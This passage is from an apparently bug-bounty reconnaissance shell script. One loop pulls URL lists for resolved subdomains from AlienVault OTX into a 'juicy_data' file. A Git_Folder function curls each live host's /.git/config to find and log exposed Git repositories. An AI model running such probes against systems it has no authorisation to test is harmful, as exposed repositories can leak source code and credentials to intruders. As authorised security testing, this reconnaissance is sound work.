		for sub in $(cat $domain/subdomains/sub_domain_record/resolved_domains.txt);do /usr/bin/gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq |egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a /root/bug_bounty/$domain/info/juicy_data.txt  ;done
		
	done

}
Juicy
Git_Folder(){
	for domain in $(cat $range);

	do
	printf "\n\n----------------------------------------------------------------------------------\n"
	        printf "                     \e[33m Extracts Juicy Informations  Is Starting ...\e[0m "
	printf "\n------------------------------------------------------------------------------------------------------------------------------------\n\n" 

		cat /root/bug_bounty/$domain/alive.txt | while read url; do  if curl $url/.git/config | grep -q "\[core\]"; then echo "Open .git repository at $url" | tee /root/bug_bounty/$domain/recon/vulnerabilities/git.txt; fi done;

	done

}
Git_Folder
